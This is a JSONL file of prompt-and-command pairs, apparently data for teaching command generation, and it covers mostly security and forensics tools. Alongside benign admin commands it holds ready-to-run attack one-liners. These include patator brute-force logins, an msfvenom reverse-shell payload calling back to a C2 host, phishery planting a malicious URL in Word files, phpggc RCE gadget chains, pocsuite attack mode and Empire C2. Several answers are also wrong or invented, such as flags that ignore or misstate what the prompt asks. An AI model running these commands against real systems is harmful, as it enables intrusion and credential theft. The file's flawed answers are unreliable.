{"input": "Delete partition number 2 on `/dev/sdb`", "answer": "parted /dev/sdb rm 2"}
{"input": "Resize partition number 3 on `/dev/sdb` to end at 1000MB", "answer": "parted /dev/sdb resizepart 3 1000MB"}
{"input": "Check if partition number 1 on `/dev/sda` is aligned optimally", "answer": "parted /dev/sda align-check opt 1"}
{"input": "Toggle the state of the lvm flag on partition number 2 of `/dev/sdb`", "answer": "parted /dev/sdb toggle 2 lvm"}
{"input": "Rescue a lost partition on `/dev/sdb` between 500MB and 1000MB", "answer": "parted /dev/sdb rescue 500MB 1000MB"}
{"input": "Inform the operating system about partition table changes for all devices without actually making any changes", "answer": "partprobe -d"}
{"input": "Extract all activity records, including deleted ones, from the `index.dat` file located at `/evidence/index.dat` and save the output to a file named `output.txt`", "answer": "pasco -d /evidence/index.dat > output.txt"}
{"input": "Extract all activity records, including deleted ones, from the `index.dat` file located at `/root/cache/index.dat` and use a colon as the field delimiter", "answer": "pasco -d -t : /root/cache/index.dat"}
{"input": "Use pth-curl to download a file from \"http://10.129.228.124/files/report.pdf\" and save it locally as \"report.pdf\"", "answer": "pth-curl -O http://10.129.228.124/files/report.pdf"}
{"input": "Use pth-curl to fetch the headers from the URL \"http://10.129.228.124\" and display them in the output", "answer": "pth-curl -i http://10.129.228.124"}
{"input": "Use pth-curl to fetch the content from \"http://10.129.228.124\" and fail immediately if the server returns an HTTP error", "answer": "pth-curl -f http://10.129.228.124"}
{"input": "Retrieve the list of groups in the domain using pth-net", "answer": "pth-net rpc group list"}
{"input": "Use pth-rpcclient to connect to the host at 10.2.2.2, specifying the debug level as 5 and using the name resolution order \"lmhosts, wins, bcast\"", "answer": "pth-rpcclient -d 5 -R \"lmhosts, wins, bcast\" 10.2.2.2"}
{"input": "Connect to the Sybase server at 192.168.1.100 using the username \"admin\" and password \"password123\", and change the database context to \"mydb\" on startup", "answer": "pth-sqsh -S 192.168.1.100 -U admin -P password123 -D mydb"}
{"input": "Connect to the Sybase server at 192.168.1.100 and set the column separator to a pipe (|) for the output", "answer": "pth-sqsh -S 192.168.1.100 -s \"|\""}
{"input": "Query the host 10.129.228.124 for all properties of the Win32_LogicalDisk class, using the username \"administrator\" and password \"adminpass\", and output the results with a comma delimiter", "answer": "pth-wmic -U administrator%adminpass --delimiter=, //10.129.228.124 \"select * from Win32_LogicalDisk\""}
{"input": "Connect to the remote host 10.10.10.5 using the domain \"CORP\" and the username \"user1\" without prompting for a password, and execute a command to display the system time", "answer": "impacket-wmiexec -no-pass CORP/user1@10.10.10.5 'cmd.exe /c time'"}
{"input": "Perform a brute-force attack on the FTP service running on the IP address 192.168.1.10 using a username list `users.txt` and a password list `passwords.txt`", "answer": "patator ftp_login host=192.168.1.10 user=FILE0 0=users.txt password=FILE1 1=passwords.txt"}
{"input": "Enumerate valid users on the SMTP server at 192.168.0.100 using the `RCPT TO` command and a list of email addresses in `rcpt_emails.txt`", "answer": "patator smtp_rcpt host=192.168.0.100 mail_from=test@example.com rcpt_to=FILE0 0=rcpt_emails.txt"}
{"input": "Perform a brute-force attack on the RDP service running on 192.168.2.50 using a username `administrator` and a password list `rdp_passwords.txt`", "answer": "patator rdp_login host=192.168.2.50 user=administrator password=FILE0 0=rdp_passwords.txt"}
{"input": "Copy all payloads related to Command Injection to a local directory for further analysis", "answer": "cp -r /usr/share/payloadsallthethings/Command\\ Injection ~/local_payloads/"}
{"input": "Create a compressed archive of the entire payloadsallthethings directory for backup purposes", "answer": "tar -czvf payloadsallthethings_backup.tar.gz /usr/share/payloadsallthethings"}
{"input": "Count the number of payload files available in the Directory Traversal category", "answer": "ls /usr/share/payloadsallthethings/Directory\\ Traversal | wc -l"}
{"input": "Search for all payloads related to \"JWT\" across the entire payloadsallthethings directory", "answer": "grep -r \"JWT\" /usr/share/payloadsallthethings"}
{"input": "Remove a specific payload file (e.g., `csrf_payloads.txt`) from the CSRF Injection directory", "answer": "rm /usr/share/payloadsallthethings/CSRF\\ Injection/csrf_payloads.txt"}
{"input": "Extract and display the content of object ID 12 from the PDF file \"data.pdf\"", "answer": "pdf-parser -o 12 data.pdf"}
{"input": "Search for the string \"admin\" in unfiltered streams within the PDF file \"config.pdf\"", "answer": "pdf-parser --searchstream admin --unfiltered config.pdf"}
{"input": "Search for the string \"secret\" in streams within the PDF file \"confidential.pdf\" using a regular expression", "answer": "pdf-parser --searchstream secret --regex confidential.pdf"}
{"input": "Crack the password of a PDF file named \"report.pdf\" using a wordlist file \"passwords.txt\"", "answer": "pdfcrack -f report.pdf -w passwords.txt"}
{"input": "Crack the user password of a PDF file named \"invoice.pdf\" while skipping passwords shorter than 6 characters and stopping at passwords longer than 12 characters", "answer": "pdfcrack -f invoice.pdf -n 6 -m 12"}
{"input": "Crack the user password of a PDF file named \"notes.pdf\" quietly, without printing verbose output", "answer": "pdfcrack -f notes.pdf -q"}
{"input": "Run linpeas with all checks enabled to perform a comprehensive privilege escalation scan on the current system", "answer": "linpeas.sh -a"}
{"input": "Execute linpeas with all checks enabled and save the output to a file named `linpeas_report.txt` for later analysis", "answer": "linpeas.sh -a > linpeas_report.txt"}
{"input": "Execute linpeas with all checks enabled, including deep analysis of files and directories, and save the output to a file named `full_scan.txt`", "answer": "linpeas.sh -a -d > full_scan.txt"}
{"input": "Run linpeas with all checks enabled, including network-related checks, and display the results in real-time without saving to a file", "answer": "linpeas.sh -a -n"}
{"input": "Run linpeas with all checks enabled, including checks for writable files and directories, and display the results in a concise format", "answer": "linpeas.sh -A"}
{"input": "Run a full privilege escalation scan on a Linux system using linpeas with all available checks enabled", "answer": "linpeas.sh -a"}
{"input": "Perform a thorough privilege escalation scan on a Windows system using winPEAS, including all possible checks", "answer": "winPEASany.exe -a"}
{"input": "Run a full privilege escalation scan on a Linux system using the small version of linpeas, ensuring all checks are performed", "answer": "linpeas_small.sh -a"}
{"input": "Execute a detailed privilege escalation scan on a 32-bit Windows system using winPEAS to identify all potential security issues", "answer": "winPEASx86.exe all"}
{"input": "Perform a complete privilege escalation assessment on a Windows system using winPEAS, including checks for services, registry, and file system vulnerabilities", "answer": "winPEASany.exe all"}
{"input": "List all pods in the Kubernetes cluster using the API server URL `https://10.96.0.1:6443` and a valid JWT token", "answer": "kubectl get pods --server=https://10.96.0.1:6443 --token=<JWT_TOKEN>"}
{"input": "Inject a malicious URL into a Word document named `good.docx` and save the output as `bad.docx`, targeting the URL `https://secure.site.local/docs`", "answer": "phishery -u https://secure.site.local/docs -i good.docx -o bad.docx"}
{"input": "Inject a malicious URL into a Word document named `invoice.docx` and save the output as `hacked_invoice.docx`, targeting the URL `https://evil.site.local/auth`", "answer": "phishery -u https://evil.site.local/auth -i invoice.docx -o hacked_invoice.docx"}
{"input": "Crawl the website \"example.com\" using photon, including all available options like DNS enumeration, secret key detection, and cloning the website locally", "answer": "photon -u https://example.com --dns --keys --clone"}
{"input": "Disable the \"xml\" module for all PHP versions and all SAPI types", "answer": "phpdismod -v ALL -s ALL xml"}
{"input": "Disable the \"json\" module for PHP version 8.1 and all SAPI types", "answer": "phpdismod -v 8.1 -s ALL json"}
{"input": "Disable the \"curl\" module for all PHP versions but only for the \"cli\" SAPI", "answer": "phpdismod -v ALL -s cli curl"}
{"input": "Disable both the \"mbstring\" and \"gd\" modules for PHP version 7.4 and the \"fpm\" SAPI", "answer": "phpdismod -v 7.4 -s fpm mbstring gd"}
{"input": "Disable the \"opcache\" module for all PHP versions and all SAPI types", "answer": "phpdismod -v ALL -s ALL opcache"}
{"input": "Disable the \"pdo_mysql\" module for PHP version 8.0 and the \"apache2\" SAPI", "answer": "phpdismod -v 8.0 -s apache2 pdo_mysql"}
{"input": "Disable the \"zip\" module for all PHP versions but only for the \"cgi\" SAPI", "answer": "phpdismod -v ALL -s cgi zip"}
{"input": "Disable the \"intl\" module for PHP version 7.3 and all SAPI types", "answer": "phpdismod -v 7.3 -s ALL intl"}
{"input": "Disable the \"soap\" module for all PHP versions and the \"fpm\" SAPI", "answer": "phpdismod -v ALL -s fpm soap"}
{"input": "Disable the \"xmlreader\" and \"xmlwriter\" modules for PHP version 8.2 and the \"cli\" SAPI", "answer": "phpdismod -v 8.2 -s cli xmlreader xmlwriter"}
{"input": "Enable the \"curl\" and \"gd\" PHP modules for all PHP versions and SAPI types", "answer": "phpenmod -v ALL -s ALL curl gd"}
{"input": "Enable the \"mbstring\" PHP module for all PHP versions and the \"cli\" SAPI type", "answer": "phpenmod -v ALL -s cli mbstring"}
{"input": "Enable the \"xml\" and \"json\" PHP modules for PHP version 8.0 and all SAPI types", "answer": "phpenmod -v 8.0 -s ALL xml json"}
{"input": "Enable the \"pdo_mysql\" PHP module for PHP version 7.3 and the \"cli\" SAPI type", "answer": "phpenmod -v 7.3 -s cli pdo_mysql"}
{"input": "Enable the \"zip\" and \"intl\" PHP modules for all PHP versions and the \"apache2\" SAPI type", "answer": "phpenmod -v ALL -s apache2 zip intl"}
{"input": "List all modules for PHP version 7.1 with the CLI SAPI and include debug information", "answer": "php7.1 -m"}
{"input": "Display the PHP API version", "answer": "php-config --phpapi"}
{"input": "Display the numeric version of PHP", "answer": "php -r \"echo PHP_VERSION_ID;\""}
{"input": "Retrieve the list of libraries required for embedding PHP", "answer": "php-config --libs"}
{"input": "Clean up any previously generated files and then prepare a PHP extension for compiling", "answer": "phpize --clean && phpize"}
{"input": "Generate a payload for Laravel RCE1 gadget chain to execute the `id` command and output it to a file named `payload.txt`", "answer": "phpggc Laravel/RCE1 system id -o payload.txt"}
{"input": "Generate a payload for the Monolog/RCE1 gadget chain, apply fast-destruct, and encode the output in base64", "answer": "phpggc Monolog/RCE1 -f -b"}
{"input": "List all available gadget chains related to Drupal", "answer": "phpggc -l drupal"}
{"input": "Generate a payload for the Symfony/RCE1 gadget chain, URLencode the output, and save it to a file named `symfony_payload.txt`", "answer": "phpggc Symfony/RCE1 -u -o symfony_payload.txt"}
{"input": "Generate a payload for the ThinkPHP/RCE1 gadget chain, apply ASCII string encoding, and output it to the terminal", "answer": "phpggc ThinkPHP/RCE1 -a"}
{"input": "Generate a payload for the ZendFramework/RCE1 gadget chain, apply armor string encoding, and convert the output to JSON", "answer": "phpggc ZendFramework/RCE1 -A -j"}
{"input": "Generate a payload for the Symfony/RCE2 gadget chain, apply soft URL encoding, and save it to a file named `soft_encoded_payload.txt`", "answer": "phpggc Symfony/RCE2 -s -o soft_encoded_payload.txt"}
{"input": "Generate a payload for the Monolog/RCE2 gadget chain, apply fast-destruct, and encode the output in base64 and URLencode it twice", "answer": "phpggc Monolog/RCE2 -f -b -u -u"}
{"input": "Start phpsploit in interactive mode after setting the target URL to `http://vuln.site/index.php`", "answer": "phpsploit -t http://vuln.site/index.php -i"}
{"input": "Analyze \"common_passwords.txt\" using pipal, show the top 15 results, and use a Google Maps API key for zip code lookups", "answer": "pipal --top 15 common_passwords.txt"}
{"input": "Set a process memory limit of 2 GiB and analyze the Plaso storage file \"large_file.plaso\"", "answer": "plaso-pinfo --process_memory_limit 2147483648 large_file.plaso"}
{"input": "Analyze a Plaso storage file using the \"browser_search\" and \"chrome_history\" analysis plugins", "answer": "plaso-psort --analysis browser_search,chrome_history /path/to/storage_file.plaso"}
{"input": "Output the processed events from a Plaso storage file in CSV format and save the results to a file named \"output.csv\"", "answer": "plaso-psort -o l2t_csv -w output.csv /path/to/storage_file.plaso"}
{"input": "Process a Plaso storage file and use a custom event formatter definitions file located at \"/path/to/custom_formatters.yaml\"", "answer": "plaso-psort --custom_formatter_definitions /path/to/custom_formatters.yaml /path/to/storage_file.plaso"}
{"input": "Extract events from a storage media image `evidence.img`, processing all Volume Shadow Snapshots (VSS) and using the time zone \"America/New_York\". Save the output to `evidence_timeline.csv`", "answer": "``bash\npsteal --source evidence.img --vss_stores all -z America/New_York -w evidence_timeline.csv\n``"}
{"input": "Extract events from a storage media image `evidence.dd`, enabling all parsers except for the `bash_history` parser. Save the output to `evidence_events.csv`", "answer": "``bash\npsteal --source evidence.dd --parsers all,!bash_history -w evidence_events.csv\n``"}
{"input": "Generate a plocate index from the mlocate database at `/var/lib/mlocate/mlocate.db` and save it to `/var/lib/mlocate/plocate.db`, while printing the version information of the plocate-build tool", "answer": "plocate-build --version && plocate-build /var/lib/mlocate/plocate.db /var/lib/mlocate/mlocate.db"}
{"input": "Update the plocate database, excluding the paths \"/mnt/backup\" and \"/var/tmp\" from being indexed", "answer": "updatedb.plocate --prunepaths \"/mnt/backup /var/tmp\""}
{"input": "Scan the IP range 192.168.1.1 to 192.168.1.254 for open ports 22, 80, and 443 using pnscan with verbose output and a timeout of 500 milliseconds", "answer": "pnscan -v -t500 192.168.1.1-192.168.1.254 22,80,443"}
{"input": "Scan the target URL `http://example.com/vuln.php?id=1` using the PoC file `example_poc.py` in verify mode", "answer": "pocsuite -u http://example.com/vuln.php?id=1 -r example_poc.py --verify"}
{"input": "Load multiple target URLs from a file named `targets.txt` and scan them using the PoC keyword `ecshop`", "answer": "pocsuite -f targets.txt -k ecshop"}
{"input": "Run an attack on the target URL `http://example.com/vuln.php?id=1` using the PoC file `example_poc.py` with a custom User-Agent header", "answer": "pocsuite -u http://example.com/vuln.php?id=1 -r example_poc.py --attack --user-agent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\""}
{"input": "Scan the target URL `http://example.com/vuln.php?id=1` using the PoC file `example_poc.py` with a proxy server `http://127.0.0.1:8080`", "answer": "pocsuite -u http://example.com/vuln.php?id=1 -r example_poc.py --proxy http://127.0.0.1:8080"}
{"input": "Scan the target URL `http://example.com/vuln.php?id=1` using the PoC file `example_poc.py` with a timeout of 20 seconds and 3 retries", "answer": "pocsuite -u http://example.com/vuln.php?id=1 -r example_poc.py --timeout 20 --retry 3"}
{"input": "Scan the target URL `http://example.com/vuln.php?id=1` using the PoC file `example_poc.py` with additional ports 8080 and 8443", "answer": "pocsuite -u http://example.com/vuln.php?id=1 -r example_poc.py -p 8080,8443"}
{"input": "Scan the target URL `http://example.com/vuln.php?id=1` using the PoC file `example_poc.py` with a custom Referer header", "answer": "pocsuite -u http://example.com/vuln.php?id=1 -r example_poc.py --headers \"Referer: http://google.com\""}
{"input": "Scan the target URL `http://example.com/vuln.php?id=1` using the PoC file `example_poc.py` with a delay of 2 seconds between requests", "answer": "pocsuite -u http://example.com/vuln.php?id=1 -r example_poc.py --delay 2"}
{"input": "Scan the target URL `http://example.com/vuln.php?id=1` using the PoC file `example_poc.py` with a custom cookie", "answer": "pocsuite -u http://example.com/vuln.php?id=1 -r example_poc.py --cookie \"sessionid=1234\""}
{"input": "Scan the target URL `http://example.com/vuln.php?id=1` using the PoC file `example_poc.py` with a maximum of 100 concurrent threads", "answer": "pocsuite -u http://example.com/vuln.php?id=1 -r example_poc.py --threads 100"}
{"input": "Scan the target URL `http://example.com/vuln.php?id=1` using the PoC file `example_poc.py` in quiet mode", "answer": "pocsuite -u http://example.com/vuln.php?id=1 -r example_poc.py --quiet"}
{"input": "Scan the target URL `http://example.com/vuln.php?id=1` using the PoC file `example_poc.py` and load additional plugins from the `plugins` directory", "answer": "pocsuite -u http://example.com/vuln.php?id=1 -r example_poc.py --plugins plugins"}
{"input": "Scan the target URL `http://example.com/vuln.php?id=1` using the PoC file `example_poc.py` and enable TLS listener for shell mode", "answer": "pocsuite -u http://example.com/vuln.php?id=1 -r example_poc.py --shell --tls"}
{"input": "Scan the target URL `http://example.com/vuln.php?id=1` using the PoC file `example_poc.py` and hide sensitive information in the output", "answer": "pocsuite -u http://example.com/vuln.php?id=1 -r example_poc.py --ppt"}
{"input": "Generate a new payload for Windows 10 that connects back to the C2 server at 192.168.1.100 on port 443", "answer": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=443 -f exe -o payload.exe"}
{"input": "Start the PoshC2 API server with all available options enabled, including verbose logging and debugging", "answer": "posh-api-server --debug --verbose"}
{"input": "Send the string \"Hello, World!\" to the IP address 10.1.1.50 on port 9999", "answer": "echo \"Hello, World!\" | powercat -c 10.1.1.50 -p 9999"}
{"input": "Start PowerShell without loading any user profiles and execute a script located at \"C:\\Scripts\\Get-Info.ps1\" with the \"-All\" parameter", "answer": "pwsh -NoProfile -File C:\\Scripts\\Get-Info.ps1 -All"}
{"input": "Execute a PowerShell command to get the current date and time without exiting the session after execution", "answer": "pwsh -NoExit -Command Get-Date"}
{"input": "Execute a Base64-encoded PowerShell command to list the contents of the \"C:\\Program Files\" directory", "answer": "pwsh -EncodedCommand ZABpAHIAIAAiAGMAOgBcAHAAcgBvAGcAcgBhAG0AIABmAGkAbABlAHMAIgA="}
{"input": "Start PowerShell with a custom settings file located at \"C:\\Config\\custom.config.json\" and execute a command to list all services", "answer": "pwsh -SettingsFile C:\\Config\\custom.config.json -Command Get-Service"}
{"input": "Start PowerShell as a login shell on Linux and execute a command to display the current working directory", "answer": "pwsh -Login -Command Get-Location"}
{"input": "Start the Empire server to begin hosting the command and control infrastructure", "answer": "empire server"}
{"input": "Execute a command on agent ID 3 to list all files in the /home directory", "answer": "starkiller --execute-command --agent-id 3 --command \"ls /home\""}
{"input": "Send a SIP request to `[email\u00a0protected]` with a delay of 500 milliseconds between test cases and a maximum reply wait time of 1000 milliseconds", "answer": "java -jar protos-sip.jar -touri [email\u00a0protected] -delay 500 -replywait 1000"}
{"input": "Export proxify logs to an Elasticsearch instance at 192.168.1.200:9200 with SSL enabled and use the index name \"proxy_logs\"", "answer": "proxify -elastic-address 192.168.1.200:9200 -elastic-ssl -elastic-index proxy_logs"}
{"input": "Configure replay-proxify to use a custom Burp Suite address at `http://192.168.1.100:8080` and save the output to a folder named `output_data`", "answer": "replay-proxify -burp-addr http://192.168.1.100:8080 -output output_data"}
{"input": "Set up replay-proxify to listen for DNS requests on port `5353` and HTTP requests on port `8080`, while using the default proxy and Burp Suite settings", "answer": "replay-proxify -dns-addr :5353 -http-addr :8080"}
{"input": "Configure replay-proxify to use a custom DNS server address at `192.168.1.150:5300`, a custom HTTP server address at `192.168.1.150:8080`, and save the output to a folder named `custom_output`", "answer": "replay-proxify -dns-addr 192.168.1.150:5300 -http-addr 192.168.1.150:8080 -output custom_output"}
{"input": "Start replay-proxify with all custom settings: Burp Suite at `http://10.0.0.2:8080`, DNS server at `10.0.0.2:10053`, HTTP server at `10.0.0.2:8080`, proxy server at `10.0.0.2:9090`, and save the output to a folder named `full_custom`", "answer": "replay-proxify -burp-addr http://10.0.0.2:8080 -dns-addr 10.0.0.2:10053 -http-addr 10.0.0.2:8080 -proxy-addr 10.0.0.2:9090 -output full_custom"}
{"input": "Set up replay-proxify to listen for DNS requests on port `5353` and HTTP requests on port `8080`, and save the output to a folder named `network_logs`", "answer": "replay-proxify -dns-addr :5353 -http-addr :8080 -output network_logs"}
{"input": "Run replay-proxify with a custom DNS server address at `192.168.1.100:5300` and a custom HTTP server address at `192.168.1.100:8080`, while saving the output to the default folder", "answer": "replay-proxify -dns-addr 192.168.1.100:5300 -http-addr 192.168.1.100:8080"}
{"input": "Connect to a specific Proxmark3 device using the port `/dev/ttyACM0`", "answer": "pm3 -p /dev/ttyACM0"}
{"input": "Flash the Proxmark3 device with the bootloader file `bootloader.elf` and two additional image files `app1.elf` and `app2.elf`, enabling the bootloader area", "answer": "pm3-flash -B -b bootloader.elf app1.elf app2.elf"}
{"input": "List all Proxmark3 devices connected to the system before performing any flashing operations", "answer": "lsusb | grep -i proxmark"}
{"input": "Flash the bootrom of the default Proxmark3 device connected via USB without specifying a device number", "answer": "pm3-flash-bootrom"}
{"input": "Flash the firmware on the fifth Proxmark3 device connected via USB", "answer": "pm3-flash-fullimage /dev/ttyACM4"}
{"input": "Perform a curl request to https://example.com using proxychains4 with a custom config file at /etc/proxychains/test.conf, ensuring the output is quiet", "answer": "proxychains4 -q -f /etc/proxychains/test.conf curl https://example.com"}
{"input": "Run a ping command to 8.8.8.8 through proxychains4 using a custom config file at /root/proxychains.conf, ensuring the output is quiet", "answer": "proxychains4 -q -f /root/proxychains.conf ping 8.8.8.8"}
{"input": "Use proxychains4 to quietly download a file from http://example.com/file.zip using wget, with a custom config file located at /etc/proxychains/download.conf", "answer": "proxychains4 -q -f /etc/proxychains/download.conf wget http://example.com/file.zip"}
{"input": "Use proxychains4 to quietly run a Python script named `test.py` with a custom config file located at /home/user/proxychains/script.conf", "answer": "proxychains4 -q -f /home/user/proxychains/script.conf python3 test.py"}
{"input": "Use pskracker to retrieve possible guest WPA keys for a router with the model number 'STU901' and BSSID 'CC:DD:EE:FF:00:11'.\"", "answer": "pskracker -t STU901 -b CC:DD:EE:FF:00:11 -G"}
{"input": "Use the 32-bit static version of pspy to monitor processes on a Linux system, with a focus on processes that have a specific session ID", "answer": "pspy32s"}
{"input": "Start a ptunnel client to connect to a proxy at 10.10.10.1, listen on local port 2222, and forward traffic to a remote server at 172.16.0.100 on port 3389. Enable continuous statistics output and set the verbosity level to 2", "answer": "ptunnel -p 10.10.10.1 -lp 2222 -da 172.16.0.100 -dp 3389 -s -v 2"}
{"input": "Start a ptunnel client to connect to a proxy at 192.0.2.50, listen on local port 5000, and forward traffic to a remote server at 203.0.113.30 on port 21. Use UDP instead of ICMP for tunneling", "answer": "ptunnel -p 192.0.2.50 -lp 5000 -da 203.0.113.30 -dp 21 -udp"}
{"input": "Start a ptunnel proxy with verbosity level 4 for maximum output, and restrict traffic to only allow connections to the destination address 10.10.10.100 on port 53", "answer": "ptunnel -da 10.10.10.100 -dp 53 -v 4"}
{"input": "Start a pwnat server on the default local IP and proxy port, allowing connections from multiple hosts: 192.0.2.10 on port 80 and 203.0.113.20 on port 22", "answer": "pwnat -s 0.0.0.0 2222 192.0.2.10:80 203.0.113.20:22"}
{"input": "Set up a pwncat listener on port 9999 with verbose output and force line endings to CRLF for all input and output", "answer": "pwncat -l -p 9999 -v -C crlf"}
{"input": "Use pwncat to connect to a remote server at 10.0.0.50 on port 53 using UDP and send an initial ping packet to establish the connection", "answer": "pwncat -u 10.0.0.50 53"}
{"input": "Recursively list all the contents of the PyInstaller archive `example_archive.exe` and display detailed information about each file", "answer": "pyi-archive_viewer example_archive.exe"}
{"input": "List the contents of the PyInstaller archive `example_archive.exe` without any additional details or logs", "answer": "pyi-archive_viewer -l example_archive.exe"}
{"input": "How can I extract version information from a Windows executable named `setup.exe` on my desktop and save it to a file called `setup_version_info.txt`?", "answer": "exiftool /home/user/Desktop/setup.exe > setup_version_info.txt"}
{"input": "I want to grab the version details from a Windows executable named `tool.exe` located in the `/opt/tools` directory and save the output to a file named `tool_version.txt`", "answer": "exiftool /opt/tools/tool.exe > tool_version.txt"}
{"input": "Create a spec file for `my_script.py` and exclude the `tkinter` module from the bundle", "answer": "pyi-makespec --exclude-module tkinter my_script.py"}
{"input": "Create a spec file for `my_script.py` and add an icon file `app_icon.ico` to the Windows executable", "answer": "pyi-makespec -i app_icon.ico my_script.py"}
{"input": "Create a spec file for `my_script.py` and specify a custom runtime temporary directory for onefile mode", "answer": "pyi-makespec --runtime-tmpdir /custom/tmp my_script.py"}
{"input": "Create a spec file for `my_script.py` and collect all submodules, data files, and binaries from the `requests` package", "answer": "pyi-makespec --collect-all requests my_script.py"}
{"input": "Create a spec file for `my_script.py` and request UAC elevation upon application start on Windows", "answer": "pyi-makespec --uac-admin my_script.py"}
{"input": "Create a one-folder bundle for `app.py`, add additional data files from `data/` to the `resources/` directory in the bundle, and clean the build cache", "answer": "pyinstaller --onedir --add-data=\"data/*:resources\" --clean app.py"}
{"input": "Bundle `app.py` into a one-file executable, add a custom manifest `app.manifest`, and request UAC admin privileges on Windows", "answer": "pyinstaller --onefile --manifest=app.manifest --uac-admin app.py"}
{"input": "Create a one-folder bundle for `script.py`, add additional binary files from `bin/` to the `lib/` directory in the bundle, and set the log level to `WARN`", "answer": "pyinstaller --onedir --add-binary=\"bin/*:lib\" --log-level=WARN script.py"}
{"input": "Analyze and extract all files from a PyInstaller executable located at \"/home/user/program.exe\" using pyinstxtractor", "answer": "pyinstxtractor /home/user/program.exe"}
{"input": "Use pyinstxtractor to extract all contents from a PyInstaller-generated file named \"malware.exe\" stored on the desktop", "answer": "pyinstxtractor ~/Desktop/malware.exe"}
{"input": "Use pyinstxtractor to extract all files from a PyInstaller executable named \"installer.exe\" and display help information about the tool", "answer": "pyinstxtractor -h && pyinstxtractor installer.exe"}
{"input": "Retrieve the execution prefix and library paths for Python C/C++ extensions", "answer": "python3-config --exec-prefix --includes --ldflags"}
{"input": "Find the installation prefix and execution prefix for Python 2 on a Linux system", "answer": "python2-config --prefix --exec-prefix"}
{"input": "Generate HTML documentation for all Python files in the `/home/user/project` directory using pydoc2", "answer": "find /home/user/project -name \"*.py\" -exec pydoc2 -w {} \\;"}
{"input": "Extract all strings from the Python script `example.py` and save the output to `messages.pot`", "answer": "pygettext2 -a -o messages.pot example.py"}
{"input": "Extract strings from `app.py` and save the output to a custom file named `app_translations.pot`", "answer": "pygettext2 -o app_translations.pot app.py"}
{"input": "Get the include directories required for compiling Python 2 C/C++ extensions", "answer": "python2-config --includes"}
{"input": "Get the include directories and library flags needed to compile a Python 2 C extension", "answer": "python2-config --includes --libs"}
{"input": "Retrieve the compiler and linker flags needed to embed Python 2 into a C application", "answer": "python2-config --cflags --ldflags"}
{"input": "Get the extension suffix and library flags for Python 2 to build a custom module", "answer": "python2-config --extension-suffix --libs"}
{"input": "Clean up all .pyc and .pyo files associated with the Debian package named \"example-package\" without displaying any output", "answer": "pyclean -q -p example-package"}
{"input": "Clean up all .pyc and .pyo files in the directory `/var/www/html` and show verbose output while specifying the Debian package \"webapp\"", "answer": "pyclean -v -p webapp /var/www/html"}
{"input": "Remove all .pyc and .pyo files in the directory `/opt/myapp` without specifying a package or displaying verbose output", "answer": "find /opt/myapp -type f \\( -name '*.pyc' -o -name '*.pyo' \\) -delete"}
{"input": "Clean up all .pyc and .pyo files associated with the Debian package \"test-package\" and display verbose output", "answer": "pyclean -v -p test-package"}
{"input": "Byte-compile all Python source files for the Debian package `myapp` and suppress all output", "answer": "pycompile -p myapp -q"}
{"input": "Byte-compile all Python source files in the directory `/usr/local/lib/mypackage` to `.pyo` files", "answer": "python3 -m compileall -O /usr/local/lib/mypackage"}
{"input": "Byte-compile all Python source files for the Debian package `myapp` with verbose output and force a rebuild", "answer": "pycompile -p myapp -v -f"}
{"input": "Create a new superuser for the Faraday application with the username \"admin\" and email \"admin@example.com\"", "answer": "faraday-manage create-superuser --username admin --email admin@example.com"}
{"input": "Synchronize host statistics and vulnerability severity data in Faraday", "answer": "faraday-manage sync-hosts-stats && faraday-manage sync-vuln-severity"}
{"input": "Run the Faraday server in debug mode with HTTPS enabled and bind it to all available interfaces", "answer": "faraday-server --debug --ssl --bind_address 0.0.0.0"}
{"input": "Configure the Faraday worker to use the \"report_queue\" and set the log level to \"info\" for detailed logging", "answer": "faraday-worker --queue report_queue --loglevel info"}
{"input": "Launch the Faraday worker with high concurrency (8 processes) for the \"data_processing\" queue and set the log level to \"debug\"", "answer": "faraday-worker --queue data_processing --concurrency 8 --loglevel debug"}
{"input": "Start the Faraday worker on the default queue with minimal logging and a concurrency of 2 processes", "answer": "faraday-worker --queue default --concurrency 2 --loglevel error"}
{"input": "Start the Faraday worker with high concurrency (10 workers) and set the log level to \"info\" for better debugging", "answer": "faraday-worker-gevent --concurrency 10 --loglevel info"}
{"input": "Run the Faraday worker on a specific Celery queue named \"scan_queue\" with a log level of \"warning\" to reduce log verbosity", "answer": "faraday-worker-gevent --queue scan_queue --loglevel warning"}
{"input": "Start the Faraday worker with default settings but increase the concurrency to 5 workers for faster task processing", "answer": "faraday-worker-gevent --concurrency 5"}
{"input": "Configure the Faraday worker to process tasks from the \"vulnerability_queue\" with a log level of \"debug\" for detailed logging", "answer": "faraday-worker-gevent --queue vulnerability_queue --loglevel debug"}
{"input": "Start the Faraday worker with a low concurrency of 2 workers and set the log level to \"error\" to only log critical issues", "answer": "faraday-worker-gevent --concurrency 2 --loglevel error"}
{"input": "Run the Faraday worker on the default queue with a high concurrency of 15 workers and a log level of \"critical\" to log only the most severe issues", "answer": "faraday-worker-gevent --concurrency 15 --loglevel critical"}
{"input": "Start the Faraday worker on a custom queue named \"custom_tasks\" with a concurrency of 8 workers and a log level of \"info.\"", "answer": "faraday-worker-gevent --queue custom_tasks --concurrency 8 --loglevel info"}
{"input": "Run the Faraday worker with default concurrency but set the log level to \"debug\" for detailed logging and specify the queue as \"default_queue.\"", "answer": "faraday-worker-gevent --queue default_queue --loglevel debug"}
{"input": "Start the Faraday worker with a concurrency of 3 workers and set the log level to \"warning\" to focus on important messages", "answer": "faraday-worker-gevent --concurrency 3 --loglevel warning"}
{"input": "Configure the Faraday worker to process tasks from the \"high_priority_queue\" with a concurrency of 12 workers and a log level of \"error.\"", "answer": "faraday-worker-gevent --queue high_priority_queue --concurrency 12 --loglevel error"}
{"input": "Initialize the Faraday database to set up the required schema and tables for the first time", "answer": "faraday-manage initdb"}
{"input": "I need to convert the LDAP domain dump files `domain_users.json` and `domain_groups.json` into BloodHound CSV files, but I want to see the help menu first to confirm the correct usage", "answer": "ldd2bloodhound -h"}
{"input": "I need to analyze LDAP domain data stored in `/data/ldap_dumps`. How can I use ldd2pretty to generate a formatted output?", "answer": "ldd2pretty -d /data/ldap_dumps"}
{"input": "Convert the LDAP domain dump files in `/tmp/ldap_output` into a readable format using ldd2pretty", "answer": "ldd2pretty --directory /tmp/ldap_output"}
{"input": "Generate a formatted report from the LDAP domain dump files in `/root/ldap_exports` using ldd2pretty", "answer": "ldd2pretty --directory /root/ldap_exports"}
{"input": "Uninstall the 'flask' package using pip without prompting for confirmation", "answer": "pip uninstall flask --no-input"}
{"input": "Enable the use of the '2020-resolver' feature in pip for resolving dependencies", "answer": "pip install --use-feature=2020-resolver"}
